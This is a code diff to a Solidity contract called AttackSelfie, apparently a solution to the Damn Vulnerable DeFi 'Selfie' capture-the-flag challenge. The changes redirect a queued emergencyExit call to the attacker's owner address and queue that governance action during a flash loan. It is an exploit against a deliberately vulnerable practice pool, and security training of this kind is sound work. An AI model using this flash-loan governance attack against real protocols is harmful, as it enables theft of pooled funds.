@@ -2,14 +2,15 @@ pragma solidity ^0.8.0;
 
 import "../selfie/SelfiePool.sol";
 import "../selfie/ISimpleGovernance.sol";
+import "../DamnValuableTokenSnapshot.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract AttackSelfie {
-    address _owner;
-    SelfiePool _pool;
-    address _token;
-    ISimpleGovernance _governance;
+    address public _owner;
+    SelfiePool public _pool;
+    address public _token;
+    ISimpleGovernance public _governance;
     uint256 public _actionId;
 
     constructor(address owner, address pool, address governance, address token) {
@@ -25,7 +26,7 @@ contract AttackSelfie {
 
         uint256 amount = _pool.token().balanceOf(address(_pool));
         
-        bytes memory _calldata = abi.encodeWithSignature("emergencyExit(address)", address(this));
+        bytes memory _calldata = abi.encodeWithSignature("emergencyExit(address)", _owner);
         
         _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, _calldata);
     }
@@ -39,7 +40,9 @@ contract AttackSelfie {
 
 
     function onFlashLoan(address borrower, address token, uint256 amount, uint256 fee, bytes calldata _data) external returns (bytes32) {
-        _actionId = _governance.queueAction(borrower, uint128(amount), _data);
+        require(msg.sender == address(_pool), "not pool");
+
+        _actionId = _governance.queueAction(address(_pool), 0, _data);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
